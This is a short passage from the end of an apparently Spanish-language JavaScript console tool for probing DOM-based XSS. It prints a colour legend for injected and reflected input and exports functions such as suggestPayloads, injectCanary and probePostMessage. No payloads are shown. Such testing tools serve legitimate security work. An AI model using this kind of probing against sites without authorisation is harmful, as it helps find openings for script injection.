    ns.log.info('   %c \u25A0 CYAN   %c = Input inyectado (source)', 'color:#00ddff;font-weight:bold', 'color:#ccc');
    ns.log.info('   %c \u25A0 MAGENTA%c = Donde se reflej\u00F3',         'color:#ff00ff;font-weight:bold', 'color:#ccc');
    ns.log.info('   %cdomxss.unhighlight()%c para quitar resaltados', 'color:#888;font-style:italic', 'color:#888');
  }

  ns.probe = {
    detectReflectionContext,
    analyzeReflection,
    suggestPayloads,
    findReflections,
    injectCanary,
    runProbe,
    probeGo,
    probeCheck,
    probePostMessage,
    printReflections,
  };
})();
